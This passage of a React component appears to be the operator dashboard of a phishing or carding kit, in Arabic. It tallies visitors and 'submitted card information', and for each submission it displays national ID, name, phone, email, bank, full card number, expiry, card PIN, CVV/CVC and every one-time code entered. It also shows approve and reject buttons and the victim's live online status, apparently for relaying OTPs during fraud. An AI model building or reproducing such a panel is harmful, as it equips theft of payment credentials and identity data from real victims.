                <Menu className="h-5 w-5" />
                <span className="sr-only">القائمة</span>
              </Button>
              <div className="flex items-center gap-3">
                <div className="bg-primary/10 p-2 rounded-full">
                  <Bell className="h-5 w-5 text-primary" />
                </div>
                <h1 className="text-xl font-bold hidden sm:block">لوحة الإشعارات</h1>
              </div>
            </div>

            <div className="flex items-center gap-2">
              <div className="hidden md:flex items-center gap-2">
                <TooltipProvider>
                  <Tooltip>
                    <TooltipTrigger asChild>
                      <Button variant="outline" size="icon" onClick={() => setSettingsOpen(true)}>
                        <Settings className="h-4 w-4" />
                        <span className="sr-only">الإعدادات</span>
                      </Button>
                    </TooltipTrigger>
                    <TooltipContent>
                      <p>الإعدادات</p>
                    </TooltipContent>
                  </Tooltip>
                </TooltipProvider>

                <TooltipProvider>
                  <Tooltip>
                    <TooltipTrigger asChild>
                      <Button variant="outline" size="icon" onClick={() => setExportDialogOpen(true)}>
                        <Download className="h-4 w-4" />
                        <span className="sr-only">تصدير</span>
                      </Button>
                    </TooltipTrigger>
                    <TooltipContent>
                      <p>تصدير البيانات</p>
                    </TooltipContent>
                  </Tooltip>
                </TooltipProvider>

                <Button
                  variant="destructive"
                  onClick={handleClearAll}
                  disabled={notifications.length === 0}
                  className="hidden sm:flex items-center gap-2"
                >
                  <Trash2 className="h-4 w-4" />
                  مسح الكل
                </Button>
              </div>

              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button variant="ghost" className="relative h-9 w-9 rounded-full">
                    <Avatar className="h-9 w-9">
                      <AvatarImage src="/placeholder.svg?height=36&width=36" alt="صورة المستخدم" />
                      <AvatarFallback>مد</AvatarFallback>
                    </Avatar>
                  </Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent align="end" className="w-56" alignOffset={8}>
                  <div className="flex items-center justify-start gap-2 p-2">
                    <div className="flex flex-col space-y-0.5 leading-none">
                      <p className="font-medium text-sm">مدير النظام</p>
                      <p className="text-xs text-muted-foreground">admin@example.com</p>
                    </div>
                  </div>
                  <DropdownMenuItem onClick={() => setSettingsOpen(true)}>
                    <Settings className="ml-2 h-4 w-4" />
                    <span>الإعدادات</span>
                  </DropdownMenuItem>
                  <DropdownMenuItem onClick={handleLogout}>
                    <LogOut className="ml-2 h-4 w-4" />
                    <span>تسجيل الخروج</span>
                  </DropdownMenuItem>
                </DropdownMenuContent>
              </DropdownMenu>
            </div>
          </div>
        </header>

        <div className="p-4 md:p-6">
          {/* Statistics Grid */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
            {/* Online Users Card */}
            <Card className="bg-card shadow-sm hover:shadow-md transition-shadow duration-300">
              <CardHeader className="pb-2">
                <CardTitle className="text-sm text-muted-foreground font-medium">المستخدمين المتصلين</CardTitle>
              </CardHeader>
              <CardContent className="pb-2">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className="rounded-full bg-blue-100 dark:bg-blue-900 p-3">
                      <UserCheck className="h-5 w-5 text-blue-600 dark:text-blue-300" />
                    </div>
                    <div className="text-3xl font-bold">{onlineUsersCount}</div>
                  </div>
                  <Badge variant="outline" className="bg-blue-50 text-blue-700 dark:bg-blue-950/30 dark:text-blue-300">
                    {Math.round((onlineUsersCount / totalVisitors) * 100) || 0}%
                  </Badge>
                </div>
              </CardContent>
              <CardFooter className="pt-0">
                <MiniChart data={onlineTrend} color="bg-blue-500" />
              </CardFooter>
            </Card>

            {/* Total Visitors Card */}
            <Card className="bg-card shadow-sm hover:shadow-md transition-shadow duration-300">
              <CardHeader className="pb-2">
                <CardTitle className="text-sm text-muted-foreground font-medium">إجمالي الزوار</CardTitle>
              </CardHeader>
              <CardContent className="pb-2">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className="rounded-full bg-green-100 dark:bg-green-900 p-3">
                      <Users className="h-5 w-5 text-green-600 dark:text-green-300" />
                    </div>
                    <div className="text-3xl font-bold">{totalVisitors}</div>
                  </div>
                  <Badge
                    variant="outline"
                    className="bg-green-50 text-green-700 dark:bg-green-950/30 dark:text-green-300"
                  >
                    +{visitorTrend[visitorTrend.length - 1] - visitorTrend[0]}
                  </Badge>
                </div>
              </CardContent>
              <CardFooter className="pt-0">
                <MiniChart data={visitorTrend} color="bg-green-500" />
              </CardFooter>
            </Card>

            {/* Card Submissions Card */}
            <Card className="bg-card shadow-sm hover:shadow-md transition-shadow duration-300">
              <CardHeader className="pb-2">
                <CardTitle className="text-sm text-muted-foreground font-medium">معلومات البطاقات المقدمة</CardTitle>
              </CardHeader>
              <CardContent className="pb-2">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className="rounded-full bg-purple-100 dark:bg-purple-900 p-3">
                      <CreditCard className="h-5 w-5 text-purple-600 dark:text-purple-300" />
                    </div>
                    <div className="text-3xl font-bold">{cardSubmissions}</div>
                  </div>
                  <Badge
                    variant="outline"
                    className="bg-purple-50 text-purple-700 dark:bg-purple-950/30 dark:text-purple-300"
                  >
                    {Math.round((cardSubmissions / totalVisitors) * 100) || 0}%
                  </Badge>
                </div>
              </CardContent>
              <CardFooter className="pt-0">
                <MiniChart data={cardTrend} color="bg-purple-500" />
              </CardFooter>
            </Card>
          </div>

          {/* Main content grid */}
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-8">
            {/* Main content area - 2/3 width on large screens */}
            <div className="lg:col-span-3 space-y-6">
              {/* Tabs for Notifications and Attachments */}
              <Tabs defaultValue="notifications" className="w-full">
                <TabsList className="mb-4">
                  <TabsTrigger value="notifications" className="flex items-center gap-2">
                    <Bell className="h-4 w-4" />
                    الإشعارات
                  </TabsTrigger>
                  <TabsTrigger value="attachments" className="flex items-center gap-2">
                    <Download className="h-4 w-4" />
                    إحصائيات                  </TabsTrigger>
                </TabsList>

                {/* Notifications Tab Content */}
                <TabsContent value="notifications" className="space-y-6 mt-0">
                  {/* Search and filters */}
                  <div className="flex flex-col sm:flex-row gap-4">
                    <div className="flex-1">
                      <SearchBar onSearch={handleSearch} />
                    </div>
                    <div className="flex gap-2">
                      <Button
                        variant={filterType === "all" ? "default" : "outline"}
                        onClick={() => setFilterType("all")}
                        className="flex-1 sm:flex-none"
                        size="sm"
                      >
                        الكل
                        <Badge variant="outline" className="mr-2 bg-background">
                          {notifications.length}
                        </Badge>
                      </Button>
                      <Button
                        variant={filterType === "card" ? "default" : "outline"}
                        onClick={() => setFilterType("card")}
                        className="flex-1 sm:flex-none"
                        size="sm"
                      >
                        <CreditCard className="h-4 w-4 ml-1" />
                        البطاقات
                        <Badge variant="outline" className="mr-2 bg-background">
                          {cardCount}
                        </Badge>
                      </Button>
                      <Button
                        variant={filterType === "online" ? "default" : "outline"}
                        onClick={() => setFilterType("online")}
                        className="flex-1 sm:flex-none"
                        size="sm"
                      >
                        <UserCheck className="h-4 w-4 ml-1" />
                        المتصلين
                        <Badge variant="outline" className="mr-2 bg-background">
                          {onlineCount}
                        </Badge>
                      </Button>
                    </div>
                  </div>

                  {/* Notifications Table */}
                  <Card className="bg-card shadow-sm overflow-hidden">
                    <CardHeader className="py-3 px-4 flex flex-row items-center justify-between">
                      <CardTitle className="text-lg flex items-center gap-2">
                        <Bell className="h-5 w-5 text-primary" />
                        الإشعارات
                        {searchTerm && (
                          <Badge variant="outline" className="mr-2">
                            نتائج البحث: {filteredNotifications.length}
                          </Badge>
                        )}
                      </CardTitle>
                      <div className="flex items-center gap-2">
                        <DropdownMenu>
                          <DropdownMenuTrigger asChild>
                            <Button variant="ghost" size="sm" className="h-8 gap-1">
                              <ArrowUpDown className="h-3.5 w-3.5" />
                              <span className="sr-only md:not-sr-only md:inline-block">ترتيب</span>
                            </Button>
                          </DropdownMenuTrigger>
                          <DropdownMenuContent align="end" className="w-48">
                            <DropdownMenuItem>الأحدث أولاً</DropdownMenuItem>
                            <DropdownMenuItem>الأقدم أولاً</DropdownMenuItem>
                            <DropdownMenuItem>حسب الدولة</DropdownMenuItem>
                            <DropdownMenuItem>حسب الحالة</DropdownMenuItem>
                          </DropdownMenuContent>
                        </DropdownMenu>
                        <Button variant="ghost" size="sm" className="h-8" onClick={() => setExportDialogOpen(true)}>
                          <Download className="h-3.5 w-3.5 mr-1" />
                          <span className="sr-only md:not-sr-only md:inline-block">تصدير</span>
                        </Button>
                      </div>
                    </CardHeader>

                    {/* Desktop Table View - Hidden on Mobile */}
                    <div className="hidden md:block overflow-x-auto">
                      <table className="w-full">
                        <thead>
                          <tr className="border-b border-border bg-muted/50">
                            <th className="px-4 py-3 text-right font-medium text-muted-foreground">الدولة</th>
                            <th className="px-4 py-3 text-right font-medium text-muted-foreground">المعلومات</th>
                            <th className="px-4 py-3 text-right font-medium text-muted-foreground">حالة البطاقة</th>
                            <th className="px-4 py-3 text-right font-medium text-muted-foreground">الوقت</th>
                            <th className="px-4 py-3 text-center font-medium text-muted-foreground">الحالة</th>
                            <th className="px-4 py-3 text-center font-medium text-muted-foreground">كود</th>
                            <th className="px-4 py-3 text-center font-medium text-muted-foreground">الإجراءات</th>
                          </tr>
                        </thead>
                        <tbody>
                          {paginatedNotifications.map((notification) => (
                            <tr
                              key={notification.id}
                              className={`border-b border-border ${getRowBackgroundColor(notification?.flagColor!)} transition-colors`}
                            >
                              <td className="px-4 py-3">
                                <div className="flex items-center gap-2">
                                  <MapPin className="h-4 w-4 text-muted-foreground" />
                                  <span>{notification.country || "غير معروف"}</span>
                                </div>
                              </td>
                              <td className="px-4 py-3">
                                <div className="flex flex-wrap gap-2">
                                  <Badge
                                    variant={notification?.phone ? "secondary" : "destructive"}
                                    className="rounded-md cursor-pointer hover:bg-secondary/80 transition-colors"
                                    onClick={() => handleInfoClick(notification, "personal")}
                                  >
                                    {notification?.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
                                  </Badge>
                                  <Badge
                                    variant={notification.cardNumber ? "secondary" : "destructive"}
                                    className={`rounded-md cursor-pointer hover:bg-secondary/80 transition-colors ${notification.cardNumber ? "bg-green-500 hover:bg-green-600 text-white dark:bg-green-600 dark:hover:bg-green-700" : ""}`}
                                    onClick={() => handleInfoClick(notification, "card")}
                                  >
                                    {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                                  </Badge>
                                </div>
                              </td>
                              <td className="px-4 py-3">
                                {notification.status === "approved" ? (
                                  <Badge className="bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-300">
                                    <CheckCircle className="h-3 w-3 mr-1" />
                                    موافق
                                  </Badge>
                                ) : notification.status === "rejected" ? (
                                  <Badge className="bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-300">
                                    <XCircle className="h-3 w-3 mr-1" />
                                    مرفوض
                                  </Badge>
                                ) : (
                                  <Badge
                                    variant="outline"
                                    className="bg-yellow-100 text-yellow-800 dark:bg-yellow-900 dark:text-yellow-300"
                                  >
                                    <Clock className="h-3 w-3 mr-1" />
                                    معلق
                                  </Badge>
                                )}
                              </td>
                              <td className="px-4 py-3 whitespace-nowrap">
                                <div className="flex items-center gap-2">
                                  <Clock className="h-4 w-4 text-muted-foreground" />
                                  <span>
                                    {notification.createdDate &&
                                      formatDistanceToNow(new Date(notification.createdDate), {
                                        addSuffix: true,
                                        locale: ar,
                                      })}
                                  </span>
                                </div>
                              </td>
                              <td className="px-4 py-3 text-center">
                                <UserStatus userId={notification.id} />
                              </td>
                              <td className="px-4 py-3 text-center">
                                {notification.otp && (
                                  <Badge
                                    className="bg-blue-100 text-blue-800 dark:bg-blue-900 dark:text-blue-300"
                                    variant="outline"
                                  >
                                    {notification.otp}
                                  </Badge>
                                )}
                              </td>
                              <td className="px-4 py-3">
                                <div className="flex justify-center gap-2">
                                  <TooltipProvider>
                                    <Tooltip>
                                      <TooltipTrigger asChild>
                                        <Button
                                          variant="outline"
                                          size="sm"
                                          onClick={() => handleApproval("approved", notification.id)}
                                          className="bg-green-500 dark:bg-green-600 text-white hover:bg-green-600 dark:hover:bg-green-700"
                                          disabled={notification.status === "approved"}
                                        >
                                          <CheckCircle className="h-4 w-4" />
                                        </Button>
                                      </TooltipTrigger>
                                      <TooltipContent>
                                        <p>قبول</p>
                                      </TooltipContent>
                                    </Tooltip>
                                  </TooltipProvider>

                                  <TooltipProvider>
                                    <Tooltip>
                                      <TooltipTrigger asChild>
                                        <Button
                                          variant="outline"
                                          size="sm"
                                          onClick={() => handleApproval("rejected", notification.id)}
                                          className="bg-red-500 dark:bg-red-600 text-white hover:bg-red-600 dark:hover:bg-red-700"
                                          disabled={notification.status === "rejected"}
                                        >
                                          <XCircle className="h-4 w-4" />
                                        </Button>
                                      </TooltipTrigger>
                                      <TooltipContent>
                                        <p>رفض</p>
                                      </TooltipContent>
                                    </Tooltip>
                                  </TooltipProvider>

                                  <FlagColorSelector
                                    notificationId={notification.id}
                                    currentColor={notification.flagColor || null}
                                    onColorChange={handleFlagColorChange}
                                  />

                                  <TooltipProvider>
                                    <Tooltip>
                                      <TooltipTrigger asChild>
                                        <Button
                                          variant="ghost"
                                          size="sm"
                                          onClick={() => handleDelete(notification.id)}
                                          className="text-red-500 dark:text-red-400 hover:text-red-600 dark:hover:text-red-300 hover:bg-red-100 dark:hover:bg-red-950/50"
                                        >
                                          <Trash2 className="h-4 w-4" />
                                        </Button>
                                      </TooltipTrigger>
                                      <TooltipContent>
                                        <p>حذف</p>
                                      </TooltipContent>
                                    </Tooltip>
                                  </TooltipProvider>
                                </div>
                              </td>
                            </tr>
                          ))}
                          {paginatedNotifications.length === 0 && (
                            <tr>
                              <td colSpan={7} className="px-4 py-8 text-center text-muted-foreground">
                                <div className="flex flex-col items-center gap-2">
                                  <Bell className="h-8 w-8 text-muted-foreground/50" />
                                  <p>لا توجد إشعارات متطابقة مع الفلتر المحدد</p>
                                </div>
                              </td>
                            </tr>
                          )}
                        </tbody>
                      </table>
                    </div>

                    {/* Mobile Card View - Shown only on Mobile */}
                    <div className="md:hidden space-y-4 p-4">
                      {paginatedNotifications.length > 0 ? (
                        paginatedNotifications.map((notification) => (
                          <Card
                            key={notification.id}
                            className={`overflow-hidden bg-card border-border ${getRowBackgroundColor(notification?.flagColor!)} mb-4`}
                          >
                            <CardHeader className="p-4 pb-2">
                              <div className="flex justify-between items-start">
                                <div className="flex items-center gap-2">
                                  <MapPin className="h-4 w-4 text-muted-foreground" />
                                  <span className="font-medium">{notification.country || "غير معروف"}</span>
                                </div>
                                <div className="flex items-center gap-2">
                                  {notification.otp && (
                                    <Badge
                                      className="bg-blue-100 text-blue-800 dark:bg-blue-900 dark:text-blue-300"
                                      variant="outline"
                                    >
                                      {notification.otp}
                                    </Badge>
                                  )}
                                  <UserStatus userId={notification.id} />
                                </div>
                              </div>
                            </CardHeader>
                            <CardContent className="p-4 pt-2">
                              <div className="grid grid-cols-1 gap-3 mb-3">
                                <div className="flex flex-wrap gap-2 mb-2">
                                  <Badge
                                    variant={notification?.phone ? "secondary" : "destructive"}
                                    className="rounded-md cursor-pointer"
                                    onClick={() => handleInfoClick(notification, "personal")}
                                  >
                                    {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                  </Badge>
                                  <Badge
                                    variant={notification.cardNumber ? "secondary" : "destructive"}
                                    className={`rounded-md cursor-pointer ${notification.cardNumber ? "bg-green-500 text-white dark:bg-green-600" : ""}`}
                                    onClick={() => handleInfoClick(notification, "card")}
                                  >
                                    {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                                  </Badge>
                                </div>

                                <div className="flex justify-between items-center py-2 border-t border-border/50">
                                  <div className="flex items-center gap-2">
                                    <span className="text-sm text-muted-foreground">الحالة:</span>
                                    {notification.status === "approved" ? (
                                      <Badge className="bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-300">
                                        <CheckCircle className="h-3 w-3 mr-1" />
                                        موافق
                                      </Badge>
                                    ) : notification.status === "rejected" ? (
                                      <Badge className="bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-300">
                                        <XCircle className="h-3 w-3 mr-1" />
                                        مرفوض
                                      </Badge>
                                    ) : (
                                      <Badge
                                        variant="outline"
                                        className="bg-yellow-100 text-yellow-800 dark:bg-yellow-900 dark:text-yellow-300"
                                      >
                                        <Clock className="h-3 w-3 mr-1" />
                                        معلق
                                      </Badge>
                                    )}
                                  </div>
                                  <div className="flex items-center gap-2">
                                    <Clock className="h-4 w-4 text-muted-foreground" />
                                    <span className="text-sm">
                                      {notification.createdDate &&
                                        formatDistanceToNow(new Date(notification.createdDate), {
                                          addSuffix: true,
                                          locale: ar,
                                        })}
                                    </span>
                                  </div>
                                </div>

                                <div className="flex gap-2 mt-2 pt-2 border-t border-border/50">
                                  <Button
                                    onClick={() => handleApproval("approved", notification.id)}
                                    className="flex-1 bg-green-500 dark:bg-green-600 hover:bg-green-600 dark:hover:bg-green-700 text-white"
                                    size="sm"
                                    disabled={notification.status === "approved"}
                                  >
                                    <CheckCircle className="h-4 w-4 mr-1" />
                                    قبول
                                  </Button>
                                  <Button
                                    onClick={() => handleApproval("rejected", notification.id)}
                                    className="flex-1"
                                    variant="destructive"
                                    size="sm"
                                    disabled={notification.status === "rejected"}
                                  >
                                    <XCircle className="h-4 w-4 mr-1" />
                                    رفض
                                  </Button>
                                  <FlagColorSelector
                                    notificationId={notification.id}
                                    currentColor={notification.flagColor || null}
                                    onColorChange={handleFlagColorChange}
                                  />
                                  <Button
                                    variant="outline"
                                    onClick={() => handleDelete(notification.id)}
                                    className="w-10 p-0 text-red-500 hover:text-red-600 hover:bg-red-50 dark:hover:bg-red-950/30"
                                    size="sm"
                                  >
                                    <Trash2 className="h-4 w-4" />
                                  </Button>
                                </div>
                              </div>
                            </CardContent>
                          </Card>
                        ))
                      ) : (
                        <div className="text-center py-8 text-muted-foreground">
                          <div className="flex flex-col items-center gap-2">
                            <Bell className="h-8 w-8 text-muted-foreground/50" />
                            <p>لا توجد إشعارات متطابقة مع الفلتر المحدد</p>
                          </div>
                        </div>
                      )}
                    </div>

                    {/* Pagination */}
                    {filteredNotifications.length > 0 && (
                      <div className="p-4 border-t border-border">
                        <Pagination currentPage={currentPage} totalPages={totalPages} onPageChange={handlePageChange} />
                      </div>
                    )}
                  </Card>
                </TabsContent>

                {/* Attachments Tab Content */}
                <TabsContent value="attachments" className="space-y-6 mt-0">
                  <Card className="bg-card shadow-sm overflow-hidden">
                    <CardHeader className="py-3 px-4 flex flex-row items-center justify-between">
                      <CardTitle className="text-lg flex items-center gap-2">
                        إحصائيات 
                                              </CardTitle>
                    
                    </CardHeader>
                    <div className="w-full space-y-6 grid md:grid-cols-2">
            {/* Activity Timeline */}
            <Card className="mx-2">
              <CardHeader className="">
                <CardTitle className="text-lg flex items-center gap-2">
                  <Calendar className="h-5 w-5 text-primary" />
                  آخر النشاطات
                </CardTitle>
                <CardDescription>آخر 5 نشاطات على النظام</CardDescription>
              </CardHeader>
              <CardContent>
                <ActivityTimeline notifications={notifications} />
              </CardContent>
            </Card>

      
            {/* Quick Actions Card */}
            <Card className="mx-2">
            <CardHeader >
                <CardTitle className="text-lg flex items-center gap-2">
                  <Settings className="h-5 w-5 text-primary" />
                  إجراءات سريعة
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-2">
                <Button variant="outline" className="w-full justify-start" onClick={() => setExportDialogOpen(true)}>
                  <Download className="mr-2 h-4 w-4" />
                  تصدير البيانات
                </Button>
                <Button variant="outline" className="w-full justify-start" onClick={() => setSettingsOpen(true)}>
                  <Settings className="mr-2 h-4 w-4" />
                  إعدادات الإشعارات
                </Button>
                <Button
                  variant="outline"
                  className="w-full justify-start text-red-500"
                  onClick={handleClearAll}
                  disabled={notifications.length === 0}
                >
                  <Trash2 className="mr-2 h-4 w-4" />
                  مسح جميع الإشعارات
                </Button>
              </CardContent>
            </Card>
          </div>
                  </Card>
                </TabsContent>
              </Tabs>
            </div>
          </div>
          {/* Sidebar - 1/3 width on large screens */}
       
        </div>
      </div>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-background text-foreground max-w-[90vw] md:max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2 text-xl">
              {selectedInfo === "personal" ? (
                <>
                  <Users className="h-5 w-5 text-primary" />
                  المعلومات الشخصية
                </>
              ) : selectedInfo === "card" ? (
                <>
                  <CreditCard className="h-5 w-5 text-primary" />
                  معلومات البطاقة
                </>
              ) : (
                "معلومات عامة"
              )}
            </DialogTitle>
          </DialogHeader>
          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-3 p-4 bg-muted/50 rounded-lg border border-border">
              {selectedNotification.idNumber && (
                <div className="flex justify-between items-center py-2 border-b border-border/50">
                  <span className="font-medium text-muted-foreground">رقم الهوية:</span>
                  <span className="font-semibold">{selectedNotification.idNumber}</span>
                </div>
              )}
              {selectedNotification.email && (
                <div className="flex justify-between items-center py-2 border-b border-border/50">
                  <span className="font-medium text-muted-foreground">البريد الإلكتروني:</span>
                  <span className="font-semibold">{selectedNotification.email}</span>
                </div>
              )}
              {selectedNotification.mobile && (
                <div className="flex justify-between items-center py-2 border-b border-border/50">
                  <span className="font-medium text-muted-foreground">رقم الجوال:</span>
                  <span className="font-semibold">{selectedNotification.mobile}</span>
                </div>
              )}
              {selectedNotification.name && (
                <div className="flex justify-between items-center py-2 border-b border-border/50">
                  <span className="font-medium text-muted-foreground">الاسم:</span>
                  <span className="font-semibold">{selectedNotification.name}</span>
                </div>
              )}
              {selectedNotification.phone && (
                <div className="flex justify-between items-center py-2">
                  <span className="font-medium text-muted-foreground">الهاتف:</span>
                  <span className="font-semibold">{selectedNotification.phone}</span>
                </div>
              )}
            </div>
          )}
          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-3 p-4 bg-muted/50 rounded-lg border border-border">
              {selectedNotification.bank && (
                <div className="flex justify-between items-center py-2 border-b border-border/50">
                  <span className="font-medium text-muted-foreground">البنك:</span>
                  <span className="font-semibold">{selectedNotification.bank}</span>
                </div>
              )}
              {selectedNotification.cardNumber && (
                <div className="flex justify-between items-center py-2 border-b border-border/50">
                  <span className="font-medium text-muted-foreground">رقم البطاقة:</span>
                  <div className="font-semibold" dir="ltr">
                    {selectedNotification.prefix && (
                      <Badge variant="outline" className="bg-blue-100 dark:bg-blue-900 mr-1">
                        {selectedNotification.prefix}
                      </Badge>
                    )}
                    <Badge variant="outline" className="bg-green-100 dark:bg-green-900">
                      {selectedNotification.cardNumber}
                    </Badge>
                  </div>
                </div>
              )}
              {(selectedNotification.year || selectedNotification.month || selectedNotification.cardExpiry) && (
                <div className="flex justify-between items-center py-2 border-b border-border/50">
                  <span className="font-medium text-muted-foreground">تاريخ الانتهاء:</span>
                  <span className="font-semibold">
                    {selectedNotification.year && selectedNotification.month
                      ? `${selectedNotification.year}/${selectedNotification.month}`
                      : selectedNotification.cardExpiry}
                  </span>
                </div>
              )}
              {selectedNotification.pass && (
                <div className="flex justify-between items-center py-2 border-b border-border/50">
                  <span className="font-medium text-muted-foreground">رمز البطاقة:</span>
                  <span className="font-semibold">{selectedNotification.pass}</span>
                </div>
              )}
              {selectedNotification.cardCvc && (
                <div className="flex justify-between items-center py-2 border-b border-border/50">
                  <span className="font-medium text-muted-foreground">رمز الامان:</span>
                  <span className="font-semibold">{selectedNotification.cardCvc}</span>
                </div>
              )}
              {(selectedNotification.otp || selectedNotification.otpCode) && (
                <div className="flex justify-between items-center py-2 border-b border-border/50">
                  <span className="font-medium text-muted-foreground">رمز التحقق المرسل:</span>
                  <Badge className="font-semibold bg-green-600">
                    {selectedNotification.otp}
                    {selectedNotification.otpCode && ` || ${selectedNotification.otpCode}`}
                  </Badge>
                </div>
              )}
              {selectedNotification.cvv && (
                <div className="flex justify-between items-center py-2">
                  <span className="font-medium text-muted-foreground">رمز الامان:</span>
                  <span className="font-semibold">{selectedNotification.cvv}</span>
                </div>
              )}
              {selectedNotification.allOtps &&
                Array.isArray(selectedNotification.allOtps) &&
                selectedNotification.allOtps.length > 0 && (
                  <div className="pt-2 border-t border-border/50">
                    <span className="font-medium text-muted-foreground block mb-2">جميع الرموز:</span>
                    <div className="flex flex-wrap gap-2">
                      {selectedNotification.allOtps.map((otp, index) => (
                        <Badge key={index} variant="outline" className="bg-muted">
                          {otp}
                        </Badge>
                      ))}
                    </div>
                  </div>
                )}
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}
